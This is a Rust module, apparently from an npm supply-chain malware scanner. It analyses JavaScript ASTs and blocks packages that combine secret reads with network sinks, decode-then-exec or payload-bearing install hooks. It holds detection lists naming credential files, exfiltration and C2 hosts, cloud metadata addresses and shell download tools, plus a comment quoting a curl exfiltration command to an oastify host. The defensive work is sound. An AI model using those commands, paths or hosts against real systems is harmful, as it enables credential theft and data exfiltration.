//! Behavioral analysis: AST-first detection that treats capabilities as neutral
//! facts and only renders a verdict on dangerous *combinations*.
//!
//! Why this exists: the substring `PATTERNS` engine flags express grade-F (it
//! uses `fs`/`http`/`process.env`) while missing most real malware. Here we walk
//! the oxc AST, so comments and string literals can't trigger code detections,
//! and we escalate only when a strong source reaches a sink, a decode feeds an
//! exec, or an install hook co-occurs with payload behavior.

use oxc::allocator::Allocator;
use oxc::ast::ast::{Argument, CallExpression, Expression, MemberExpression};
use oxc::ast_visit::Visit;
use oxc::parser::Parser;
use oxc::span::SourceType;

/// Neutral behavioral facts extracted from one or more source files.
#[derive(Debug, Default, Clone)]
pub struct Behavior {
    // -- capabilities (neutral) --
    pub net: bool,
    pub fs: bool,
    pub subprocess: bool,
    pub code_exec: bool, // eval / new Function / vm.run*
    pub env_read: bool,  // any process.env access

    // -- strong sources --
    pub env_whole: bool,      // whole process.env captured (spread/stringify/keys/passed)
    pub sensitive_env: bool,  // process.env.<token/secret/key/aws/github/...>
    pub cred_path: bool,      // a STRING LITERAL credential path (~/.ssh, .npmrc, .aws, /etc/passwd)

    // -- decode + nesting --
    pub decode: bool,           // Buffer.from(_, 'base64'|'hex') / atob / fromCharCode
    pub decode_into_exec: bool, // eval(atob(..)) / require(fromCharCode(..)) etc. (AST-nested)

    // hand-authored (non-minified) variants -- minified bundles legitimately
    // contain eval + Buffer.from, so the weak `code_exec && decode` signal must
    // only count when it appears in hand-written source.
    pub hand_code_exec: bool,
    pub hand_decode: bool,

    // -- network->exec (second stage) --
    pub fetch_into_exec: bool,

    // -- high-signal string-literal markers --
    pub suspicious_host: bool, // attacker TLDs/hosts/IP literals
    pub worm_marker: bool,     // trufflehog / cloud-metadata IP / npm publish-in-code

    // -- shell download chain inside a string passed to exec --
    pub shell_download: bool,
}

impl Behavior {
    pub fn merge(&mut self, o: &Behavior) {
        self.net |= o.net;
        self.fs |= o.fs;
        self.subprocess |= o.subprocess;
        self.code_exec |= o.code_exec;
        self.env_read |= o.env_read;
        self.env_whole |= o.env_whole;
        self.sensitive_env |= o.sensitive_env;
        self.cred_path |= o.cred_path;
        self.decode |= o.decode;
        self.decode_into_exec |= o.decode_into_exec;
        self.hand_code_exec |= o.hand_code_exec;
        self.hand_decode |= o.hand_decode;
        self.fetch_into_exec |= o.fetch_into_exec;
        self.suspicious_host |= o.suspicious_host;
        self.worm_marker |= o.worm_marker;
        self.shell_download |= o.shell_download;
    }

    /// A strong sensitive-data source (not just reading NODE_ENV).
    pub fn strong_source(&self) -> bool {
        self.env_whole || self.sensitive_env || self.cred_path
    }
}

/// Tiered verdict: capabilities alone are Info; dangerous combinations escalate.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Verdict {
    Info,
    Warn,
    Block,
}

/// Compute a verdict from aggregated package behavior + whether package.json has
/// an install hook. Returns the verdict and human-readable reasons.
pub fn verdict(b: &Behavior, has_install_script: bool) -> (Verdict, Vec<String>) {
    let mut reasons = Vec::new();
    let mut block = false;

    if b.strong_source() && b.net {
        block = true;
        reasons.push("exfiltration: sensitive env/credentials read alongside a network sink".into());
    }
    if b.decode_into_exec {
        block = true;
        reasons.push("decoded payload executed (decode -> eval/Function/require)".into());
    }
    if b.fetch_into_exec {
        block = true;
        reasons.push("second-stage payload: remote content passed to eval/Function".into());
    }
    if b.worm_marker && (b.net || b.subprocess) {
        block = true;
        reasons.push("worm/secret-stealer markers (trufflehog / cloud metadata / republish)".into());
    }
    if b.suspicious_host && (b.net || b.strong_source() || b.subprocess) {
        block = true;
        reasons.push("contacts known exfiltration/C2 infrastructure".into());
    }
    // Install-hook payloads: require *payload* behavior, not a bare capability.
    // Legit native packages (esbuild/sharp/better-sqlite3/prisma) have install
    // hooks AND use eval/network to download+build binaries -- only shell payloads,
    // C2 sinks, decode-into-exec, or worm markers indicate a malicious hook.
    if has_install_script
        && (b.shell_download || b.suspicious_host || b.decode_into_exec || b.worm_marker)
    {
        block = true;
        reasons.push("install hook runs payload behavior (shell/C2/decode-exec/worm)".into());
    }
    if b.shell_download && b.subprocess {
        block = true;
        reasons.push("spawns a shell download chain (curl/wget/certutil)".into());
    }

    if block {
        return (Verdict::Block, reasons);
    }

    let mut warn = false;
    if b.strong_source() && b.subprocess {
        warn = true;
        reasons.push("reads secrets and spawns processes".into());
    }
    // NOTE: a bare `code_exec && decode` rule was measured to add false positives
    // (jsdom/socket.io/elysia use eval + Buffer.from legitimately) without
    // recovering recall (obfuscated malware ships minified, excluded by the
    // hand-authored gate). The high-confidence form is decode_into_exec (Blocks).
    // NOTE: deliberately no bare `code_exec && net` rule -- bundlers/webpack
    // runtimes legitimately eval modules and reference the network, which made
    // next.js's vendored dist/compiled bundles false-positive.

    if warn {
        (Verdict::Warn, reasons)
    } else {
        (Verdict::Info, reasons)
    }
}

/// Scan an install-hook command string (preinstall/install/postinstall) for
/// payload behavior. Many npm attacks put the entire payload in the command
/// (`curl --data @- evil.oastify.com`, `node -e "..."`, `... | bash`), which a
/// file-only scan never sees.
pub fn scan_install_command(cmd: &str, b: &mut Behavior) {
    let lc = cmd.to_ascii_lowercase();
    if SHELL_DOWNLOAD.iter().any(|m| cmd.contains(m))
        || lc.contains("/dev/tcp")
        || lc.contains("base64 -d")
        || lc.contains("base64 --decode")
        || lc.contains("|sh")
        || lc.contains("| sh")
        || lc.contains("|bash")
        || lc.contains("| bash")
        || lc.contains("python -c")
        || lc.contains("python3 -c")
        || lc.contains("node -e")
        || lc.contains("eval(")
    {
        b.shell_download = true;
    }
    if SUSPICIOUS_HOST.iter().any(|h| lc.contains(&h.to_ascii_lowercase())) {
        b.suspicious_host = true;
    }
    if WORM_MARKER.iter().any(|w| cmd.contains(w)) {
        b.worm_marker = true;
    }
}

/// Analyze one source file into behavioral facts. Never executes anything.
pub fn analyze_file(source: &str, path: &str) -> Behavior {
    let allocator = Allocator::default();
    let source_type = infer_source_type(path);
    let parsed = Parser::new(&allocator, source, source_type).parse();
    let mut b = Behavior::default();
    if parsed.program.body.is_empty() {
        return b;
    }
    let mut v = BehaviorVisitor { b: &mut b };
    v.visit_program(&parsed.program);
    if !is_minified(source) {
        b.hand_code_exec = b.code_exec;
        b.hand_decode = b.decode;
    }
    b
}

/// Minified/bundled files have very long lines; eval + Buffer.from there are
/// expected (webpack/source-maps) and must not drive weak heuristics.
fn is_minified(source: &str) -> bool {
    source.lines().map(str::len).max().unwrap_or(0) > 1000
}

struct BehaviorVisitor<'a> {
    b: &'a mut Behavior,
}

/// Is this expression a `process.env` member (the whole env object)?
fn is_process_env(expr: &Expression) -> bool {
    if let Expression::StaticMemberExpression(m) = expr {
        if m.property.name == "env" {
            if let Expression::Identifier(obj) = &m.object {
                return obj.name == "process";
            }
        }
    }
    false
}

/// Identifier/member callee name as a dotted string, e.g. "child_process.exec",
/// "https.request", "axios.post", "eval". Best-effort, two levels deep.
fn callee_name(callee: &Expression) -> Option<String> {
    match callee {
        Expression::Identifier(id) => Some(id.name.to_string()),
        Expression::StaticMemberExpression(m) => {
            let prop = m.property.name.as_str();
            match &m.object {
                Expression::Identifier(obj) => Some(format!("{}.{}", obj.name, prop)),
                _ => Some(prop.to_string()),
            }
        }
        _ => None,
    }
}

const SENSITIVE_ENV: &[&str] = &[
    "TOKEN", "SECRET", "PASSWORD", "PASSWD", "PRIVATE", "APIKEY", "API_KEY", "AWS",
    "GITHUB", "GH_TOKEN", "NPM_TOKEN", "SSH", "CREDENTIAL", "ACCESS_KEY", "CLIENT_SECRET",
];

const CRED_PATH_FRAGMENTS: &[&str] = &[
    ".ssh/id_rsa", ".ssh/id_ed25519", ".aws/credentials", ".aws/config", ".npmrc",
    "/etc/passwd", "/etc/shadow", "id_rsa", "Library/Keychains",
    "Login Data", "/.config/gcloud", ".docker/config.json",
    "/.env", "\\.env", ".env.local", ".env.production", "wallet.dat", ".bash_history",
];

const SUSPICIOUS_HOST: &[&str] = &[
    ".ngrok.io", ".ngrok-free.app", "webhook.site", "burpcollaborator", "requestbin",
    "pipedream.net", "interact.sh", ".oast.", "oastify.com", "dnslog.cn", ".nip.io",
    "transfer.sh", "0x0.st", "discord.com/api/webhooks", "discordapp.com/api/webhooks",
    // Telegram/Discord bot C2 and anonymous file drops are the dominant npm-stealer
    // sinks. (IP-lookup hosts like ifconfig.me are recon, not exfil -- excluded to
    // avoid flagging legitimate geo packages.)
    "api.telegram.org/bot", "file.io", "anonfiles", "gofile.io", "paste.ee", "termbin.com",
];

const WORM_MARKER: &[&str] = &[
    "trufflehog", "169.254.169.254", "metadata.google.internal",
    "shai-hulud", "npm publish", "npm_package_description",
];

const SHELL_DOWNLOAD: &[&str] = &[
    "curl ", "wget ", "certutil", "Invoke-WebRequest", "bitsadmin", "| bash", "| sh",
    "powershell -", "regsvr32", "rundll32",
];

fn looks_base64ish(s: &str) -> bool {
    // long-ish and made of base64 alphabet
    s.len() >= 24
        && s.bytes()
            .all(|c| c.is_ascii_alphanumeric() || c == b'+' || c == b'/' || c == b'=')
}

impl<'a> BehaviorVisitor<'a> {
    /// Does this argument expression decode data (base64/charcode)?
    fn arg_is_decode(&self, arg: &Expression) -> bool {
        if let Expression::CallExpression(c) = arg {
            if let Some(name) = callee_name(&c.callee) {
                let n = name.as_str();
                if n == "atob" || n.ends_with(".from") || n == "Buffer.from" {
                    return true;
                }
                if n.ends_with("fromCharCode") || n == "unescape" {
                    return true;
                }
            }
        }
        false
    }

    /// Check a static string (from a string literal or a template-literal quasi)
    /// for credential paths, exfil hosts, worm markers, and shell payloads.
    fn check_string(&mut self, v: &str) {
        if CRED_PATH_FRAGMENTS.iter().any(|p| v.contains(p)) {
            self.b.cred_path = true;
        }
        let vl = v.to_ascii_lowercase();
        if SUSPICIOUS_HOST.iter().any(|h| vl.contains(h)) {
            self.b.suspicious_host = true;
        }
        if WORM_MARKER.iter().any(|w| v.contains(w)) {
            self.b.worm_marker = true;
        }
        if SHELL_DOWNLOAD.iter().any(|c| v.contains(c)) {
            self.b.shell_download = true;
        }
    }

    fn arg_is_fetchlike(&self, arg: &Expression) -> bool {
        if let Expression::CallExpression(c) = arg {
            if let Some(name) = callee_name(&c.callee) {
                let n = name.to_ascii_lowercase();
                return n == "fetch"
                    || n.ends_with(".get")
                    || n.contains("request")
                    || n.contains("download");
            }
        }
        if let Expression::AwaitExpression(_) = arg {
            return true; // eval(await ...) -- common second-stage form
        }
        false
    }
}

impl<'a> Visit<'a> for BehaviorVisitor<'a> {
    fn visit_call_expression(&mut self, it: &CallExpression<'a>) {
        if let Some(name) = callee_name(&it.callee) {
            let n = name.as_str();

            // require('<module>')
            if n == "require" {
                if let Some(Argument::StringLiteral(s)) = it.arguments.first() {
                    match s.value.as_str() {
                        "http" | "https" | "net" | "dgram" | "dns" | "tls" | "node:http"
                        | "node:https" | "node:net" | "node:dns" => self.b.net = true,
                        "child_process" | "node:child_process" => self.b.subprocess = true,
                        "fs" | "node:fs" | "fs/promises" => self.b.fs = true,
                        "vm" | "node:vm" => self.b.code_exec = true,
                        _ => {}
                    }
                }
            }

            // code-exec sinks
            if n == "eval" || n.ends_with(".runInContext") || n.ends_with(".runInNewContext")
                || n.ends_with("._compile") || n == "Function"
            {
                self.b.code_exec = true;
                // decode-then-exec / fetch-then-exec via first arg
                if let Some(a) = it.arguments.first().and_then(arg_as_expr) {
                    if self.arg_is_decode(a) {
                        self.b.decode_into_exec = true;
                    }
                    if self.arg_is_fetchlike(a) {
                        self.b.fetch_into_exec = true;
                    }
                }
            }

            // network sinks
            let nl = n.to_ascii_lowercase();
            if nl == "fetch"
                || nl.starts_with("axios")
                || nl.ends_with(".request")
                || nl.ends_with(".get")
                || nl.ends_with(".post")
                || nl.ends_with(".connect")
                || nl.ends_with(".write") && self.b.net
            {
                if nl == "fetch" || nl.starts_with("axios") || nl.ends_with(".request")
                    || nl.ends_with(".connect")
                {
                    self.b.net = true;
                }
            }

            // subprocess sinks
            if n.ends_with(".exec") || n.ends_with(".execSync") || n.ends_with(".spawn")
                || n.ends_with(".spawnSync") || n.ends_with(".fork") || n.ends_with(".execFile")
            {
                self.b.subprocess = true;
            }

            // decode primitives (neutral on their own)
            if n == "atob" || n == "Buffer.from" || n.ends_with("fromCharCode") {
                self.b.decode = true;
            }

            // whole-env capture: process.env passed as a call argument, or
            // JSON.stringify(process.env), Object.keys/entries/assign(process.env)
            for arg in &it.arguments {
                if let Some(e) = arg_as_expr(arg) {
                    if is_process_env(e) {
                        self.b.env_whole = true;
                    }
                }
            }
        }

        oxc::ast_visit::walk::walk_call_expression(self, it);
    }

    fn visit_member_expression(&mut self, it: &MemberExpression<'a>) {
        if let MemberExpression::StaticMemberExpression(m) = it {
            // process.env.X
            if is_process_env(&m.object) {
                self.b.env_read = true;
                let prop = m.property.name.as_str().to_ascii_uppercase();
                if SENSITIVE_ENV.iter().any(|s| prop.contains(s)) {
                    self.b.sensitive_env = true;
                }
            }
            // process.env itself (object position handled by callers / spreads)
            if m.property.name == "env" {
                if let Expression::Identifier(obj) = &m.object {
                    if obj.name == "process" {
                        self.b.env_read = true;
                    }
                }
            }
        }
        oxc::ast_visit::walk::walk_member_expression(self, it);
    }

    fn visit_string_literal(&mut self, it: &oxc::ast::ast::StringLiteral<'a>) {
        self.check_string(it.value.as_str());
        let _ = looks_base64ish; // reserved for a future blob-entropy signal
    }

    fn visit_template_literal(&mut self, it: &oxc::ast::ast::TemplateLiteral<'a>) {
        // Malware builds exfil URLs with interpolation (`api.telegram.org/bot${t}`);
        // the host lives in the static quasi parts, not a plain string literal.
        for q in &it.quasis {
            self.check_string(q.value.raw.as_str());
        }
        oxc::ast_visit::walk::walk_template_literal(self, it);
    }
}

fn arg_as_expr<'a, 'b>(arg: &'b Argument<'a>) -> Option<&'b Expression<'a>> {
    arg.as_expression()
}

fn infer_source_type(path: &str) -> SourceType {
    if path.ends_with(".ts") || path.ends_with(".tsx") {
        SourceType::ts()
    } else if path.ends_with(".mjs") {
        SourceType::mjs()
    } else {
        SourceType::cjs()
    }
}
